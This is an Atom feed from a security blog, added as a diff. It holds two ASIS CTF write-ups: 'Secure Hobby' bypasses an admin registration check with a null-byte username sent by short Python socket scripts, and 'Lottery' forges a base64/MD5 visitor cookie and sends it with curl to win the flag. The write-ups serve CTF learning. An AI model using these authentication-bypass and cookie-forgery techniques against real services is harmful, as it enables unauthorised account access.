@@ -1,0 +1,241 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Asis, | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/asis/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2014-11-01T15:20:37+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ASIS-CTF: Secure Hobby]]></title>
+    <link href="http://barrebas.github.io/blog/2014/11/01/asis-ctf-secure-hobby/"/>
+    <updated>2014-11-01T14:56:11+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/11/01/asis-ctf-secure-hobby</id>
+    <content type="html"><![CDATA[<p>For Secure Hobby, a 250 point challenge, we were given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using <code>nc</code>, the program first crashes because it can&rsquo;t find <code>flag</code> and <code>namak</code>. After creating those files and connecting again, we are presented with the following:</p>
+
+<!--more-->
+
+
+<pre><code class="bash">$ nc localhost 35565
+-------------------------------------------------
+|   Welcome to Super Secure Auth Engine |
+-------------------------------------------------
+
+1) Register
+2) Login check
+3) Show my secret
+
+Enjoy ;)
+1
+Enter username: test
+Your key for login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6
+</code></pre>
+
+<p>Hmm. The second function verifies a login and the third displays a secret. Trying to register the user &lsquo;admin&rsquo; resulted in an error. Still, it&rsquo;s fair to assume we need to get the secret of the admin user. Let&rsquo;s break this key down.</p>
+
+<pre><code class="bash">$ echo -ne 'test' |md5sum
+098f6bcd4621d373cade4e832627b4f6  -
+</code></pre>
+
+<p>This looks like the last part of the login. What about the start? It seems to end with <code>\x3d</code> which is ASCII <code>=</code>. This screams base64!</p>
+
+<pre><code class="bash">$ xxd -p -r
+6447567a64413d3d
+dGVzdA==
+$ echo -ne 'dGVzdA==' |base64 -d
+test
+</code></pre>
+
+<p>So putting it all together again:</p>
+
+<pre><code class="bash">$ echo -ne 'admin' |base64
+YWRtaW4=
+$ echo -ne 'admin' |md5sum
+21232f297a57a5a743894a0e4a801fc3  -
+xxd -p 
+YWRtaW4=
+595752746157343d0a
+</code></pre>
+
+<p>Looks like <code>595752746157343d21232f297a57a5a743894a0e4a801fc3</code> is the login we need! But alas, this doesn’t work. On the remote box, registering <code>test</code> returns:</p>
+
+<pre><code class="bash">$ nc asis-ctf.ir 12439
+-------------------------------------------------
+|   Welcome to Super Secure Auth Engine |
+-------------------------------------------------
+
+1) Register
+2) Login check
+3) Show my secret
+
+Enjoy ;)
+1
+Enter username: test
+Your key for login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f
+</code></pre>
+
+<p>It has to do with the <code>namak</code> file. Namak is Persian for salt.</p>
+
+<pre><code class="bash">$ echo '0' &gt; namak
+</code></pre>
+
+<p>Now, registering test on the localhost server returns <code>Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53</code>. Furthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+from socket import *
+import time, re, struct
+
+s = socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 35565))
+s.connect(('asis-ctf.ir', 12439))
+
+print s.recv(256)
+
+s.send('1\n')
+print s.recv(256)
+
+s.send('\n')
+
+print s.recv(200)
+print s.recv(200)
+</code></pre>
+
+<p>The output showed:</p>
+
+<pre><code class="bash">Enter username: 
+Your key for login is: 
+5624717e9a5fd673f17f5678c6303ffe
+</code></pre>
+
+<p>So the md5 of the salt would be <code>5624717e9a5fd673f17f5678c6303ffe</code>. I enlisted the help of NullMode to crack this hash, but to no avail. Instead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing <code>admin</code>, but perhaps we can circumvent this checking system somehow. First, I tried:</p>
+
+<pre><code>admin                                              #
+</code></pre>
+
+<p>But this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let&rsquo;s register a user <code>\x00admin</code> using Python:</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+from socket import *
+import time, re, struct
+
+s = socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 35565))
+s.connect(('asis-ctf.ir', 12439))
+
+print s.recv(256)
+
+s.send('1\n')
+print s.recv(256)
+
+s.send('\x00admin\n')
+
+print s.recv(200)
+print s.recv(200)
+</code></pre>
+
+<p>This little gem returned <code>4147466b62576c7503812bbd45e23c059a0eab18e936b7ed</code>. Let&rsquo;s try it out!</p>
+
+<pre><code class="bash">$ nc asis-ctf.ir 12439
+-------------------------------------------------
+|   Welcome to Super Secure Auth Engine |
+-------------------------------------------------
+
+1) Register
+2) Login check
+3) Show my secret
+
+Enjoy ;)
+2
+Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
+OK
+User admin authenticated
+</code></pre>
+
+<p>Holy crap, it worked! Let&rsquo;s grab that secret! Fingers crossed:</p>
+
+<pre><code class="bash">$ nc asis-ctf.ir 12439
+-------------------------------------------------
+|   Welcome to Super Secure Auth Engine |
+-------------------------------------------------
+
+1) Register
+2) Login check
+3) Show my secret
+
+Enjoy ;)
+3
+Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
+The flag is: ASIS_65cc76f02093977bfd7629086e813666
+</code></pre>
+
+<p>BOOM! We just landed another flag :) This one was actually fun to solve!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ASIS-CTF: Lottery]]></title>
+    <link href="http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery/"/>
+    <updated>2014-11-01T14:52:32+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery</id>
+    <content type="html"><![CDATA[<p>Lottery was a 100 point web challenge in the ASIS Finals CTF. The description only said &lsquo;Go here: <a href="http://asis-ctf.ir:12437">http://asis-ctf.ir:12437</a>&rsquo;. That webpage was mostly non-functional, but said that the 1234567890th visitor would win a <em>prize</em>. Gee, I wonder what that is? My browser informed me that there were no cookies, but I wasn&rsquo;t convinced.</p>
+
+<!--more-->
+
+
+<p><img src="/assets/asisctf/lottery-01.png" alt="" /></p>
+
+<p>I turned to <code>curl</code>. Luckily, curl informed me that there was indeed a cookie been set. A cookie named &lsquo;Visitor&rsquo;, no less:</p>
+
+<p><img src="/assets/asisctf/lottery-02.png" alt="" /></p>
+
+<p>The value looked like base64 so I decoded it:</p>
+
+<pre><code>$ echo -ne 'MTM4NjozNjM3NjNlNWMzZGMzYTY4YjM5OTA1OGMzNGFlY2YyYw==' |base64 -d
+1386:363763e5c3dc3a68b399058c34aecf2c
+</code></pre>
+
+<p>Hmm. I figured that first number was a visitor number. What could the second string be? MD5 maybe?</p>
+
+<pre><code>$ echo -ne 1386 |md5sum
+363763e5c3dc3a68b399058c34aecf2c  -
+</code></pre>
+
+<p>Spot on. It&rsquo;s now easy to fake the right cookie:</p>
+
+<pre><code>$ echo -ne 1234567890 |md5sum
+e807f1fcf82d132f9bb018ca6738a19f  -
+$ echo -ne '1234567890:e807f1fcf82d132f9bb018ca6738a19f' |base64
+MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
+</code></pre>
+
+<p>And feed it into curl:</p>
+
+<pre><code>$ curl -v http://asis-ctf.ir:12437/ --cookie "Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg=="
+* About to connect() to asis-ctf.ir port 12437 (#0)
+*   Trying 87.107.124.12...
+* connected
+* Connected to asis-ctf.ir (87.107.124.12) port 12437 (#0)
+&gt; GET / HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: asis-ctf.ir:12437
+&gt; Accept: */*
+&gt; Cookie: Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
+&gt; 
+...snip...
+Google+"&gt;&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class="data-wrapper"&gt;&lt;p class="title"&gt;The 1234567890 th visitor, the prize awarded.&lt;/p&gt;&lt;div class="content"&gt;Anyone who has visited our site is the 1234567890 th Special prizes are awarded. &lt;br/&gt;the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c&lt;/div&gt;&lt;/div&gt;&lt;div class="footer"&gt;&lt;div class="p
+</code></pre>
+
+<p>The flag is <code>ASIS_9f1af649f25108144fc38a01f8767c0c</code>. Easy!</p>
+]]></content>
+  </entry>
+  
+</feed>
